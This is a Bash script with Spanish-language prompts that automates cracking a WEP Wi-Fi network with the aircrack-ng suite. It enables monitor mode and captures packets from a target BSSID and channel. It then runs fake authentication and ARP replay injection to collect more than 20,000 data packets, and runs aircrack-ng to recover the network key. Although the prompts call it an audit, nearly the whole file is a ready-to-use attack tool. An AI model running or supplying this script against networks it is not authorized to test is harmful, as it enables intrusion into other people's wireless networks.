#!/bin/bash

ROJO=$(tput setaf 1)
VERDE=$(tput setaf 2)
echo $VERDE
iwconfig | awk '(NR == 1) {print "tu red wifi es :" $1}'
echo -e "\n"
echo "escribe el nombre de tarjeta de red desde la que vas a crear la interfaz en modo monit$"
echo $ROJO
read tarjeta
airmon-ng start $tarjeta
sleep 2
clear
iwconfig | grep mon0
echo $GREEN
echo "escribe el nombre de la intefaz que está en modo monitor"
echo $ROJO
read monitor

xterm -bg black -fg green -geometry 155-37+1+0  -T "REDES WIFI DISPONIBLES" -e airodump-ng $monitor

echo $VERDE
echo "pon nombre del archivo donde se van a guardar los datos capturados"
echo $ROJO
read nombre
echo $VERDE
echo "escribie el numero de canal de la red wifi que se audita"
echo $ROJO
read canal
echo $VERDE
echo "escribe BSSID DE LA RED WIFI"
read bssid
xterm -bg black -fg green -geometry 155-37+1+0  -T "krack de WIFI DISPONIBLES" -e airodump-ng -w $nombre -c $canal --bssid $bssid --ignore-negative-one $monitor &
sleep 2
xterm -bg black -fg green -geometry 155-37+1+0  -T "Autentificacion" -e aireplay-ng -1 0 -a $bssid --ignore-negative-one $monitor &
sleep 2
xterm -bg black -fg green -geometry 155-37+1+0  -T "INYECTAR PAQUETES" -e aireplay-ng -3 -b  $bssid --ignore-negative-one $monitor &
sleep 2

echo $VERDE
echo "para obtener la clave de la red wifi debes de tener más de 20.000 en la columna data, en ese caso escribe el numero 1 y luego ENTER"
until [ $respuesta = 1 ]; do
echo "1) ya tengo más de 20000 data"
echo "2) todavia no tengo 20000 data"
echo -n "#?"
read respuesta
done

aircrack-ng $nombre*.cap
sleep 2
airmon-ng stop $monitor
exit



